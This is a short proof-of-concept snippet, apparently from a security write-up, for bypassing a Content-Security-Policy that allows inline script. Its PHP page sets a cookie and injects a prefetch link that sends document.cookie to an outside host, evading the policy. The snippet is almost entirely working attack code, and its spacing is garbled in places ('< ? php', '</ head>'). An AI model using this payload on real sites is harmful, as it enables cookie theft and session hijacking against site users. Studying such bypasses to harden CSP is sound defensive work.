// If the csp rules looks like this 
// 
// Content-Security-Policy :  default-src  'self' ;  script-src  'self'  test . N0tr00t . Com  'unsafe-inline' ;
//
//
// poc bypass:
```
    
    <? php

    header ( "Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';" );

    ?>

    <html> 
    <head> </ head> 
    <body> 
        csp header test 
        <script> 
        document.cookie = "csp =" + escape ("sad @ jisajid & * JDSJddsajhdsajkh21sa213123o1") + ";";

        var n0t = document.createElement ("link"); 
        n0t.setAttribute ("rel", "prefetch"); 
        n0t.setAttribute ("href", "//1J38ax.chromecsptest.test.text.com/?" + document .cookie); 
        document.head.appendChild (n0t); 
        </ script> 
    </ body> 
    </ html>
